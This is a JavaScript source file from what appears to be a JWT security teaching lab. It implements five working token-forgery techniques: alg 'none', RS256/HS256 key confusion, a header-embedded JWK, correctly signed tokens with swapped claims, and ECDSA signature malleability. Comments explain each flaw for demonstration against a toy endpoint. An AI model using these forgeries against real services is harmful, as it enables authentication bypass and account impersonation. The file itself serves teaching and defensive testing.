/*!
 * Sahih — part of the biassp.github.io portfolio
 * Copyright (c) 2026 Bias Satrio Putra. All rights reserved.
 * Not open source. Readable for evaluation only. See /LICENSE.
 * https://biassp.github.io/
 */
/* Sahih — palsu.js  (palsu: Indonesian for "fake", "forged")
 * The forger, and it is written as an adversary would write it: no flag on the
 * issuer, no branch, no option object. Each of the five functions takes only
 * opaque material — a payload, some bytes, a token string — and never a key
 * object it could not have obtained honestly. That constraint is the whole
 * argument. A forger that had to be handed the lab's private CryptoKey would be
 * demonstrating the lab's cooperation, not an attack; four of these five need
 * no secret at all, and the fifth (malleate) sees only a string.
 *
 * THE FIVE, AND WHAT EACH IS ALLOWED TO TOUCH:
 *   algNone(payload)                       a string. No key, no crypto, synchronous.
 *   confuse(publicKeyBytes, payload)       bytes. MACs a public key as a secret.
 *   embedJwk(subtle, payload)              generates its OWN pair in the tab.
 *   claimSwap(subtle, jwkPriv, patch, base) the lab's real key, wrong claims.
 *   malleate(tokenString)                  a string, and nothing else.
 *
 * WHY THIS FILE BORROWS SAHIH_BYTES. It reaches for exactly one sibling — the
 * base64url encoder — and that is defensible for one reason, stated here so the
 * grep that finds two names finds an explanation with them: that encoder's
 * output is pinned by the vector suite to RFC 7515 Appendix A.1's published
 * segment eyJ0eXAiOiJKV1QiLA0KICJhbGciOiJIUzI1NiJ9, which is an external oracle.
 * A bug in it therefore reddens a published vector rather than quietly moving
 * both sides of one of this lab's own comparisons. A forger with its own
 * encoder could hide an encoding bug inside its own forgeries forever.
 *
 * DETERMINISM. algNone, confuse and claimSwap are total given their inputs
 * (HS256 and the concatenation are deterministic; ES256's nonce is not, but the
 * fixture excludes every forged signature from equality assertions and asserts
 * only verification booleans over them). embedJwk generates a fresh pair each
 * call by design — the attacker's key is theirs — and is asserted only on
 * properties invariant to it. No non-crypto randomness source, no clock, ever.
 */
(function (root) {
  'use strict';

  var B = root.SAHIH_BYTES;
  if (!B) throw new Error('sahih/palsu.js: SAHIH_BYTES must load first');

  var NS = {};

  /* Import and signing parameters for the algorithms a forger uses here, kept
     as a small local table rather than reached for, so this file names one
     sibling and no more. Only ES256 and RS256 are exercised by the lab; HMAC is
     built inline in confuse where the raw-key mechanism is the point. */
  var SIGN = {
    ES256: { imp: { name: 'ECDSA', namedCurve: 'P-256' }, op: { name: 'ECDSA', hash: { name: 'SHA-256' } } },
    RS256: { imp: { name: 'RSASSA-PKCS1-v1_5', hash: { name: 'SHA-256' } }, op: { name: 'RSASSA-PKCS1-v1_5' } }
  };

  /* The private JWK names its own algorithm through its key type — an EC key
     signs ES256, an RSA key signs RS256 — so claimSwap need not be told, and a
     caller cannot pair a key with an algorithm it cannot perform. */
  function algForKty(kty) {
    if (kty === 'EC') return 'ES256';
    if (kty === 'RSA') return 'RS256';
    throw new Error('sahih: palsu cannot sign for kty ' + String(kty));
  }

  function seg(text) { return B.b64uEncode(B.utf8Encode(text)); }

  function toBytes(x) {
    if (x instanceof Uint8Array) return x;
    return new Uint8Array(x);
  }

  /* ---------------------------------------------------- rung 1: alg "none" */

  /* By string concatenation, with no key of any kind, and a trailing dot where
     a signature would be. The header is written as a literal so its bytes are
     exactly {"alg":"none","typ":"JWT"} — the shape §2.2 pins — rather than at
     the mercy of some serialiser's key order. */
  function algNone(payload) {
    return seg('{"alg":"none","typ":"JWT"}') + '.' + seg(JSON.stringify(payload)) + '.';
  }

  /* --------------------------------------------- rung 2: RS256 → HS256 */

  /* Takes BYTES, never a key object and never a JWK, and MACs them. Any byte
     string imports as a raw HMAC key — that is the mechanism, not a refusal —
     so the attacker's guess at how the server serialises its PUBLIC key becomes
     an HMAC secret without anybody deciding it should.
     The header carries kid k_FIKTIF_rs so the toy endpoint's keyring resolves
     the RSA verification key deliberately rather than by falling through to a
     default; a "1 of 6" result reached by accident would prove nothing.
     crypto.subtle is not an argument here (the spec's signature gives it none),
     so it is read from the global — the same one every tab already has — and a
     returned promise carries any rejection back to the caller, which chains a
     catch, so no rejection is ever dropped. */
  function confuse(publicKeyBytes, payload) {
    var subtle = root.crypto && root.crypto.subtle;
    if (!subtle) return Promise.reject(new Error('sahih: palsu.confuse needs crypto.subtle'));
    var signingInput = seg('{"alg":"HS256","typ":"JWT","kid":"k_FIKTIF_rs"}') + '.' + seg(JSON.stringify(payload));
    return subtle.importKey('raw', toBytes(publicKeyBytes), { name: 'HMAC', hash: { name: 'SHA-256' } }, false, ['sign'])
      .then(function (key) { return subtle.sign({ name: 'HMAC' }, key, B.utf8Encode(signingInput)); })
      .then(function (mac) { return signingInput + '.' + B.b64uEncode(new Uint8Array(mac)); });
  }

  /* ------------------------------------------ rung 3: the header supplies a key */

  /* Needs no server secret, which is what makes it a real advisory rather than
     a demo that worked because the demo arranged for it to. The attacker mints
     their OWN pair in the tab, publishes the public half inside the header, and
     signs with the private half they alone hold. A verifier that reads its key
     out of the token verifies the signature perfectly — against the wrong key.
     key_ops and ext are stripped because a real attacker minimises the header,
     and because their presence is noise the point does not need. */
  function embedJwk(subtle, payload) {
    return subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign', 'verify'])
      .then(function (pair) {
        return subtle.exportKey('jwk', pair.publicKey).then(function (pub) {
          if (pub.key_ops) delete pub.key_ops;
          if (pub.ext !== undefined) delete pub.ext;
          var signingInput = seg(JSON.stringify({ alg: 'ES256', typ: 'JWT', jwk: pub })) + '.' + seg(JSON.stringify(payload));
          return subtle.sign({ name: 'ECDSA', hash: { name: 'SHA-256' } }, pair.privateKey, B.utf8Encode(signingInput))
            .then(function (sig) { return signingInput + '.' + B.b64uEncode(new Uint8Array(sig)); });
        });
      });
  }

  /* ----------------------------------- rung 4: correctly signed, wrong claims */

  /* NOT a forgery. These tokens are signed by the lab's real private key over a
     payload the lab chose, so subtle.verify returns true for every one — the
     interesting fact, because it lets a reader watch the signature check pass
     while the claim is a lie. The base payload arrives as the fourth argument
     rather than being owned here, so the swapped claims sit on top of the same
     iss/aud/sub the endpoint pins; a forger that carried its own base would be
     forging identity as well, which is a different and less honest demonstration.
     A patch value of null DELETES its claim — that is how "no exp at all" is
     built without a separate function for it. */
  function claimSwap(subtle, jwkPriv, patch, base) {
    var payload = JSON.parse(JSON.stringify(base)), k;
    for (k in patch) {
      if (Object.prototype.hasOwnProperty.call(patch, k)) {
        if (patch[k] === null) { delete payload[k]; } else { payload[k] = patch[k]; }
      }
    }
    var alg, params;
    try {
      alg = algForKty(jwkPriv && jwkPriv.kty);
      params = SIGN[alg];
    } catch (e) {
      return Promise.reject(e);
    }
    var hdr = { alg: alg, typ: 'JWT' };
    /* The key names itself, exactly as the honest issuer does: a kid invented at
       signing time is one no verifier could have pinned in advance. */
    if (jwkPriv && jwkPriv.kid) hdr.kid = jwkPriv.kid;
    var signingInput = seg(JSON.stringify(hdr)) + '.' + seg(JSON.stringify(payload));
    return subtle.importKey('jwk', jwkPriv, params.imp, false, ['sign'])
      .then(function (key) { return subtle.sign(params.op, key, B.utf8Encode(signingInput)); })
      .then(function (sig) { return signingInput + '.' + B.b64uEncode(new Uint8Array(sig)); });
  }

  /* --------------------------------------------- rung 5: the centrepiece */

  /* Its signature is literally function malleate(tokenString): it can see no
     key, and it needs none. P-256's verification recovers a point and compares
     an x-coordinate, which both s and n − s satisfy, so rewriting the low half
     of the signature as n − s yields a DIFFERENT token that still verifies.
     The header and the payload are copied through untouched, byte for byte, so
     the same sub and the same jti ride inside a token string a denylist keyed
     on that string has never seen. subBytes reports its borrow rather than
     wrapping silently — read from .bytes, because a subtraction that lied about
     n − s is the one input this rung must not get wrong. */
  function malleate(tokenString) {
    var parts = String(tokenString).split('.');
    if (parts.length !== 3) throw new Error('sahih: palsu.malleate needs a three-segment token');
    var sig = B.b64uDecodeStrict(parts[2]);
    var r = sig.slice(0, sig.length - 32);
    var s = sig.slice(sig.length - 32);
    var diff = B.subBytes(B.P256_N, s);
    var sPrime = diff.bytes;
    var out = new Uint8Array(r.length + sPrime.length), i;
    for (i = 0; i < r.length; i++) out[i] = r[i];
    for (i = 0; i < sPrime.length; i++) out[r.length + i] = sPrime[i];
    return parts[0] + '.' + parts[1] + '.' + B.b64uEncode(out);
  }

  NS.algNone = algNone;
  NS.confuse = confuse;
  NS.embedJwk = embedJwk;
  NS.claimSwap = claimSwap;
  NS.malleate = malleate;

  root.SAHIH_PALSU = NS;
  if (typeof module !== 'undefined' && module.exports) module.exports = root.SAHIH_PALSU;
})(typeof self !== 'undefined' ? self : (typeof globalThis !== 'undefined' ? globalThis : this));
